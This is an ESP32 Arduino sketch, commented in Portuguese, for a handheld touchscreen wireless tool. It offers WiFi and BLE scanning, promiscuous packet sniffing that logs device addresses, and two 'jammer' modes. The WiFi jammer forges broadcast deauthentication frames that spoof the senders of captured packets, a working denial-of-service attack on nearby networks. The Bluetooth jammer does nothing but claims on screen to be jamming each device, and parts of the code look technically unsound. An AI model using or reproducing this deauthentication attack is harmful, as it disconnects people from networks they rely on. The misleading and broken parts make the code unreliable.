#include <TFT_eSPI.h>  // Biblioteca para a tela TFT
#include <SPI.h>
#include <WiFi.h>      // Biblioteca para o WiFi
#include "BLEDevice.h" // Biblioteca para o BLE
#include "esp_wifi.h"  // Biblioteca para o modo promíscuo do Wi-Fi
#include "esp_wifi_types.h"  // Inclui as definições de tipos necessárias

// Declaração da instância da classe TFT_eSPI
TFT_eSPI tft = TFT_eSPI(); 

#define BUTTON_W 150
#define BUTTON_H 40
#define BUTTON_X 330
#define BUTTON_Y_START 20
#define BUTTON_GAP 60

uint16_t touchX, touchY;
bool exitFlag = false; // Flag para sinalizar a saída

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
        tft.setCursor(0, tft.getCursorY());
         std::string name = advertisedDevice.getName().c_str();  
        int rssi = advertisedDevice.getRSSI();
        
        // Destacar se for um AirTag da Apple
        if (name.find("AirTag") != std::string::npos) {
            tft.setTextColor(TFT_RED, TFT_BLACK);
        } else {
            tft.setTextColor(TFT_WHITE, TFT_BLACK);
        }

        tft.printf("Device: %s, RSSI: %d\n", name.c_str(), rssi);
    }
};

BLEScan* pBLEScan;
wifi_promiscuous_filter_t snifferFilter = {
  .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

// Definições das estruturas
typedef struct {
  unsigned frame_ctrl:16;
  unsigned duration_id:16;
  uint8_t addr1[6]; /* receiver address */
  uint8_t addr2[6]; /* sender address */
  uint8_t addr3[6]; /* filtering address */
  unsigned sequence_ctrl:16;
  uint8_t addr4[6]; /* optional */
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0]; /* network data ended with 4 bytes csum (CRC32) */
} wifi_ieee80211_packet_t;

struct Button {
  int x, y, w, h;
  const char* label;
};

Button buttons[] = {
  {BUTTON_X, BUTTON_Y_START, BUTTON_W, BUTTON_H, "WiFi Scan"},
  {BUTTON_X, BUTTON_Y_START + BUTTON_GAP, BUTTON_W, BUTTON_H, "WiFi Sniffer"},
  {BUTTON_X, BUTTON_Y_START + 2 * BUTTON_GAP, BUTTON_W, BUTTON_H, "BLE Sniffer"},
  {BUTTON_X, BUTTON_Y_START + 3 * BUTTON_GAP, BUTTON_W, BUTTON_H, "BLE Scan"},
  {BUTTON_X, BUTTON_Y_START + 4 * BUTTON_GAP, BUTTON_W, BUTTON_H, "WiFi Jammer"},
  {BUTTON_X, BUTTON_Y_START + 5 * BUTTON_GAP, BUTTON_W, BUTTON_H, "Bluetooth Jammer"}
};

void setup() {
  Serial.begin(115200);
  tft.init();
  tft.setRotation(3);  // Ajusta a rotação para 480x320

  drawUI();
  
  // Certifique-se de que o WiFi esteja desligado inicialmente
  WiFi.mode(WIFI_OFF);
  delay(100);
  WiFi.mode(WIFI_STA); // Modo de estação (client)

  // Inicializa o BLE
  BLEDevice::init("");
}

void loop() {
  if (tft.getTouch(&touchX, &touchY)) {
    handleTouch((int)touchX, (int)touchY); // Converte touchX e touchY para int
  }
}

void drawUI() {
  tft.fillScreen(TFT_BLACK);

  // Desenha o logo
  tft.fillRect(0, 0, 145, 30, TFT_GREEN);
  tft.setTextColor(TFT_BLACK, TFT_GREEN);
  tft.setTextSize(2);
  tft.setCursor(6, 8);
  tft.println("GrANA|ZERO");

  // Desenha o hashrate, temperatura e memória livre com espaçamento de 50 pixels
  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.setCursor(150, 10); // Ajustado com espaçamento de 50 pixels
  tft.setTextSize(1);
  tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  tft.print("T:" + String(temperatureRead(), 1) + "C ");
  uint32_t freeHeap = ESP.getFreeHeap();
  tft.print("MEM:" + String(ESP.getFreeHeap()) + "B");

  // Exibir hora atual e uso da CPU
 // timeStamp = String(hour()) + ":" + String(minute()) + ":" + String(second());
  tft.print("Hora:");
 // tft.print(timeStamp);

  // Desenha os botões
  for (int i = 0; i < sizeof(buttons) / sizeof(buttons[0]); i++) {
    drawButton(buttons[i]);
  }
}

void drawButton(Button btn) {
  tft.fillRect(btn.x, btn.y, btn.w, btn.h, TFT_BLUE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(2);
  tft.setCursor(btn.x + 5, btn.y + 10);
  tft.print(btn.label);
}

void handleTouch(int tx, int ty) {
  int invertedTx = tft.width() - tx;  // Inverte o eixo x
  for (int i = 0; i < sizeof(buttons) / sizeof(buttons[0]); i++) {
    if (invertedTx > buttons[i].x && invertedTx < buttons[i].x + buttons[i].w &&
        ty > buttons[i].y && ty < buttons[i].y + buttons[i].h) {
      executeButtonAction(i);
      break;
    }
  }
}

void executeButtonAction(int buttonIndex) {
  exitFlag = false; // Reseta a flag ao entrar em uma função

  // Chama a função apropriada com base no botão pressionado
  switch (buttonIndex) {
    case 0:
      scanWiFi();
      break;
    case 1:
      WiFiSniffer();
      break;
    case 2:
      BLESniffer();
      break;
    case 3:
      scanBluetooth();
      break;
    case 4:
      wifiJammer();
      break;
    case 5:
      bluetoothJammer();
      break;
  }
}

void scanWiFi() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(0, 0);

  while (!exitFlag) {
    WiFi.disconnect(); // Desconecta de qualquer rede conectada
    delay(100);

    int n = WiFi.scanNetworks(); // Realiza o escaneamento das redes

    for (int i = 0; i < n; ++i) {
      String ssid = WiFi.SSID(i);
      int32_t rssi = WiFi.RSSI(i);
      float distance = calculateDistance(rssi);
      String encryptionType = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Secured";
      
      // Atualiza a linha correspondente com informações da rede
      tft.fillRect(0, i * 20, 480, 20, TFT_BLACK); // Limpa a linha
      tft.setCursor(0, i * 20);
      tft.printf("%d: %s ", i + 1, ssid.c_str());
      
      // Desenha a barra de nível de sinal
      int barLength = map(rssi, -100, -30, 0, 100);
      tft.fillRect(150, i * 20, barLength, 10, TFT_GREEN);

      // Mostra o nível de sinal e a distância
      tft.setCursor(260, i * 20);
      tft.printf("(%d dBm, ", rssi);
      tft.setTextColor(TFT_YELLOW, TFT_BLACK);
      tft.printf("%.1f m", distance);
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
      tft.printf(", %s)", encryptionType.c_str());
    }

    // Verifica se a flag de saída foi setada
    if (tft.getTouch(&touchX, &touchY)) {
      exitFlag = true;
      drawUI();
      break;
    }

    delay(1000);  // Espera 1 segundo antes de escanear novamente
  }
}

float calculateDistance(int32_t rssi) {
  int txPower = -69; // Valor típico para a potência de transmissão de um ponto de acesso WiFi
  if (rssi == 0) {
    return -1.0; // Não foi possível calcular a distância
  }

  float ratio = rssi * 1.0 / txPower;
  if (ratio < 1.0) {
    return pow(ratio, 10);
  } else {
    return (0.89976) * pow(ratio, 7.7095) + 0.111;
  }
}

void scanBluetooth() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);
  tft.setCursor(0, 0);

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->start(10, false);

  BLEScanResults results = *pBLEScan->getResults();
  for (int i = 0; i < results.getCount(); i++) {
    BLEAdvertisedDevice device = results.getDevice(i);
    std::string name = device.getName().c_str();
    int rssi = device.getRSSI();
    float distance = calculateDistance(rssi);

    // Atualiza a linha correspondente com informações do dispositivo BLE
    tft.fillRect(0, i * 20, 480, 20, TFT_BLACK); // Limpa a linha
    tft.setCursor(0, i * 20);
    tft.printf("%d: %s ", i + 1, name.c_str());

    // Desenha a barra de nível de sinal
    int barLength = map(rssi, -100, -30, 0, 100);
    tft.fillRect(150, i * 20, barLength, 10, TFT_GREEN);

    // Mostra o nível de sinal e a distância
    tft.setCursor(260, i * 20);
    tft.printf("(%d dBm, ", rssi);
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.printf("%.1f m", distance);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.printf(")");
  }

  // Verifica se a flag de saída foi setada
  if (tft.getTouch(&touchX, &touchY)) {
    exitFlag = true;
    drawUI();
  }
}

void BLESniffer() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.println("BLE Sniffer...");

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->start(0, false);

  while (!exitFlag) {
    BLEScanResults results = *pBLEScan->getResults(); // Desreferencia o ponteiro aqui
    for (int i = 0; i < results.getCount(); i++) {
      BLEAdvertisedDevice device = results.getDevice(i);
      tft.printf("Device: %s, Address: %s\n", device.getName().c_str(), device.getAddress().toString().c_str());
      delay(10);
    }

    // Verifica se a flag de saída foi setada
    if (tft.getTouch(&touchX, &touchY)) {
      exitFlag = true;
      drawUI();
      break;
    }
    delay(100);
  }
}

void WiFiSniffer() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.setTextSize(1);

  tft.println("WiFi Sniffer...");

  WiFi.disconnect();
  WiFi.mode(WIFI_MODE_STA);
  WiFi.mode(WIFI_STA);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&snifferFilter);
  esp_wifi_set_promiscuous_rx_cb(wifiSnifferPacketHandler);

  while (!exitFlag) {
    // Verifica se a flag de saída foi setada
    if (tft.getTouch(&touchX, &touchY)) {
      exitFlag = true;
      esp_wifi_set_promiscuous(false);
      drawUI();
      break;
    }
    delay(100);
  }
}

void wifiSnifferPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)p->payload;
  const wifi_ieee80211_mac_hdr_t *hdr = (wifi_ieee80211_mac_hdr_t *) &ipkt->payload[0];

  tft.setCursor(0, tft.getCursorY());
  
  // Verifica se o pacote é criptografado
  bool isEncrypted = (hdr->frame_ctrl & 0x0040);
  if (isEncrypted) {
    tft.setTextColor(TFT_RED, TFT_BLACK); // Cor para pacotes criptografados
  } else {
    tft.setTextColor(TFT_GREEN, TFT_BLACK); // Cor para pacotes não criptografados
  }

  tft.printf("Packet: %02x:%02x:%02x:%02x:%02x:%02x\n", 
             hdr->addr2[0], hdr->addr2[1], hdr->addr2[2], 
             hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
}

void wifiJammer() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.setTextSize(2);
  tft.println("WiFi Jammer ON");

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(wifiJammerPacketHandler);

  while (!exitFlag) {
    if (tft.getTouch(&touchX, &touchY)) {
      exitFlag = true;
      break;
    }
    delay(100);
  }

  esp_wifi_set_promiscuous(false);
  drawUI();
}

void wifiJammerPacketHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;
  const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)p->payload;

  // Interfere com o pacote enviando um pacote de desautenticação
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01,                         // Frame Control
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,             // Destination Address (broadcast)
    ipkt->hdr.addr2[0], ipkt->hdr.addr2[1], ipkt->hdr.addr2[2], ipkt->hdr.addr2[3], ipkt->hdr.addr2[4], ipkt->hdr.addr2[5], // Source Address
    ipkt->hdr.addr2[0], ipkt->hdr.addr2[1], ipkt->hdr.addr2[2], ipkt->hdr.addr2[3], ipkt->hdr.addr2[4], ipkt->hdr.addr2[5], // BSSID
    0x00, 0x00,                                     // Fragment & Sequence Number
    0x07, 0x00                                      // Reason Code (unspecified)
  };

  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

void bluetoothJammer() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.setTextSize(2);
  tft.println("Bluetooth Jammer ON");

  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  pBLEScan->start(0, false);

  while (!exitFlag) {
    BLEScanResults results = *pBLEScan->getResults(); // Desreferencia o ponteiro aqui
    for (int i = 0; i < results.getCount(); i++) {
      BLEAdvertisedDevice device = results.getDevice(i);

      // Interfere com o dispositivo BLE de alguma maneira (não trivial)
      // Por exemplo, você pode enviar pacotes BLE não solicitados

      // Aqui, apenas imprimimos os dispositivos encontrados
      tft.printf("Jamming Device: %s\n", device.getAddress().toString().c_str());
      delay(10);
    }

    if (tft.getTouch(&touchX, &touchY)) {
      exitFlag = true;
      drawUI();
      break;
    }
    delay(100);
  }
}
